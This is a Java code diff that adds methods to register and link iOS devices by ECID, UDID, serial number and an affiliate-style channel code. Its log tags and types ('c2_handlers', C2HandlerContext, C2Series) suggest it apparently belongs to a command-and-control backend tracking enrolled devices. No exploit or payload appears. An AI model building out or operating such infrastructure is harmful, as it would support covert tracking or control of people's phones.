@@ -170,6 +170,130 @@ public class DeviceResolver {
     }
 
     /**
+     * /api/wp/t /api/tg/t：先按 ecid/unique/serial 关联；
+     * 已有设备则补写空 channelcode；未命中且 body.channel 有效时按渠道码建机。
+     */
+    public Long resolveAndLinkWithChannelCode(C2HandlerContext ctx, String ecid, String unique,
+                                              String serial, String channelCode,
+                                              String model, String iosVersion) {
+        long recordId = ctx.getRecordId();
+        String code = channelCode == null ? "" : channelCode.trim();
+        Long rowId = resolveAndLink(ctx, ecid, ecid, unique, model, iosVersion, serial, null);
+        if (rowId != null) {
+            fillChannelCodeIfBlank(ctx, code);
+            return rowId;
+        }
+
+        String normEcid = DeviceIdUtil.normalize(ecid);
+        String udid = DeviceIdUtil.normalizeUdid(unique);
+        String normSerial = serial == null || serial.trim().isEmpty()
+                ? "" : DeviceIdUtil.normalize(serial);
+        if (normEcid.isEmpty()) {
+            log.info("正常日志:[c2_handlers] wp/tg 无 ecid 且未命中设备，跳过新建, id={}, path={}",
+                    recordId, ctx.getPath());
+            return null;
+        }
+        if (code.isEmpty()) {
+            log.info("正常日志:[c2_handlers] wp/tg 未命中设备且无 channel，跳过新建, id={}, path={}, ecid={}",
+                    recordId, ctx.getPath(), normEcid);
+            return null;
+        }
+        ChannelEntity channel;
+        try {
+            channel = channelDao.findByChannelcode(code);
+        } catch (Exception e) {
+            log.info("异常日志:[c2_handlers] 按 channelcode 查渠道失败, channel={}, err={}",
+                    code, e.getMessage());
+            return null;
+        }
+        if (channel == null || channel.getChannelcode() == null || channel.getChannelcode().isEmpty()) {
+            log.info("正常日志:[c2_handlers] wp/tg channel 无效，跳过新建, id={}, channel={}",
+                    recordId, code);
+            return null;
+        }
+
+        DeviceEntity device = new DeviceEntity();
+        device.setChannelCode(channel.getChannelcode().trim());
+        device.setIp(ctx.getClientIp());
+        device.setDomain(ctx.getDomain() == null ? "" : ctx.getDomain());
+        device.setAddtime(System.currentTimeMillis() / 1000.0);
+        device.setDeviceId(normEcid);
+        device.setEcid(normEcid);
+        if (!udid.isEmpty()) {
+            device.setUdid(udid);
+            device.setDeviceUuid(udid);
+        }
+        if (!normSerial.isEmpty()) {
+            device.setSerial(normSerial);
+        }
+        device.setModel(model);
+        device.setIosVersion(iosVersion);
+        device.setDevicestatus(1);
+        device.setOnlinestatus(1);
+        device.setBindPhase(1);
+        device.setIpstatus(0);
+        device.setLastEventAt(System.currentTimeMillis() / 1000.0);
+        device.setC2Series(0);
+
+        DeviceEntity saved;
+        try {
+            saved = deviceWriteService.insertOrFind(device, normEcid, normEcid, "",
+                    ecid == null ? "" : ecid.trim(), "", udid, normSerial);
+        } catch (Exception e) {
+            log.info("错误日志:[c2_handlers] wp/tg 新建设备失败, ecid={}, err={}", normEcid, e.getMessage());
+            ctx.setDeviceId(normEcid);
+            return null;
+        }
+        if (saved == null || saved.getId() == null) {
+            ctx.setDeviceId(normEcid);
+            throw new BodyNotReadyException("device not ready (concurrent create), ecid=" + normEcid);
+        }
+        putDeviceCache(normEcid, saved);
+        if (saved.getDeviceId() != null) {
+            putDeviceCache(saved.getDeviceId(), saved);
+        }
+        log.info("正常日志:[c2_handlers] wp/tg 按渠道建机, ecid={}, rowId={}, channel={}, path={}, recordId={}",
+                saved.getDeviceId() == null ? normEcid : saved.getDeviceId(),
+                saved.getId(), saved.getChannelCode(), ctx.getPath(), recordId);
+        return applyFound(ctx, saved, normEcid, recordId);
+    }
+
+    private void fillChannelCodeIfBlank(C2HandlerContext ctx, String channelCode) {
+        if (ctx == null || channelCode == null || channelCode.isEmpty()) {
+            return;
+        }
+        Integer rowId = ctx.getDeviceRowId();
+        if (rowId == null || rowId <= 0) {
+            return;
+        }
+        if (ctx.getChannelcode() != null && !ctx.getChannelcode().isEmpty()) {
+            return;
+        }
+        try {
+            DeviceEntity existing = deviceDao.selectById(rowId);
+            if (existing == null) {
+                return;
+            }
+            if (existing.getChannelCode() != null && !existing.getChannelCode().isEmpty()) {
+                applyChannelcode(ctx, existing.getChannelCode());
+                return;
+            }
+            DeviceEntity patch = new DeviceEntity();
+            patch.setId(rowId);
+            patch.setChannelCode(channelCode);
+            deviceDao.updateById(patch);
+            existing.setChannelCode(channelCode);
+            applyChannelcode(ctx, channelCode);
+            invalidateDeviceCache(existing);
+            putDeviceCacheKeys(existing);
+            log.info("正常日志:[c2] wp/tg 补写 channelcode, rowId={}, channel={}", rowId, channelCode);
+        } catch (Exception e) {
+            log.info("异常日志:[c2_handlers] 补写 channelcode 失败, rowId={}, err={}",
+                    rowId, e.getMessage());
+        }
+    }
+
+    /**
      * /t：① lhu（最快、最准）→ ② d/f → ③ u/s；不新建、不做 sleep 重试。
      * multipart 的 d/f 常与 /a 不一致，主要靠 lhu。
      */
